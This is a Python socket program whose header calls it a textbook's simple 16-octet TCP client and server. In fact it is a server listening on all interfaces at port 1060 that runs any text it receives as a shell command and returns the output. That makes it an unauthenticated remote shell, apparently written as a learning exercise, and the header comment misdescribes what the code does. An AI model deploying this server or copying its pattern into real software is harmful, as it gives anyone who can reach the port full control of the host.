#!/usr/bin/env python3
# Foundations of Python Network Programming, Third Edition
# https://github.com/brandon-rhodes/fopnp/blob/m/py3/chapter03/tcp_sixteen.py
# Simple TCP client and server that send and receive 16 octets

import argparse, socket
from time import ctime
import subprocess

BUFSIZ = 1024
PORT = 1060

def recvall(sock, length):
    data = b''
    while len(data) < length:
        more = sock.recv(length - len(data))
        if not more:
            raise EOFError('was expecting %d bytes but only received'
                           ' %d bytes before the socket closed'
                           % (length, len(data)))
        data += more
    return data

def server(interface, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((interface, port))
    sock.listen(1)
    print('Listening at', sock.getsockname())
    while True:
        try:
            # print('Waiting to accept a new connection')
            sc, sockname = sock.accept()
            print('We have accepted a connection from', sockname)
            # print('  Socket name:', sc.getsockname())
            # print('  Socket peer:', sc.getpeername())
            # message = recvall(sc, 16)
            # 经典接受阻塞
            while True:
                message = sc.recv(BUFSIZ)
                if not message:
                    break
                cmd = message.decode('utf-8')
                print(cmd)
                # print('  Incoming sixteen-octet message:', repr(message))
                
                # sc.sendall(b'Farewell, client')

                p=subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
                res_err=p.stderr.read()
                print(res_err)
                res = p.stdout.read()
                if res_err:
                    res=res_err
                elif not res_err and not res:
                    print('........')
                    res='run success'.encode('gbk')
                size=len(res)
                sc.send(str(size).encode('utf-8'))
                message=sc.recv(BUFSIZ)
                if message.decode('utf-8')=='ready':
                    sc.send(res)

                # sc.sendall(('[%s] %s' %(ctime(), message)).encode())
            sc.close()
            # print('  Reply sent, socket closed')
        except Exception as e:
            print(e)
            continue



if __name__ == '__main__':
    # choices = {'client': client, 'server': server}
    # parser = argparse.ArgumentParser(description='Send and receive over TCP')
    # parser.add_argument('role', choices=choices, help='which role to play')
    # parser.add_argument('host', help='interface the server listens at;'
    #                     ' host the client sends to')
    # parser.add_argument('-p', metavar='PORT', type=int, default=1060,
    #                     help='TCP port (default 1060)')
    # args = parser.parse_args()
    # function = choices[args.role]
    # function(args.host, args.p)
    server('0.0.0.0', PORT)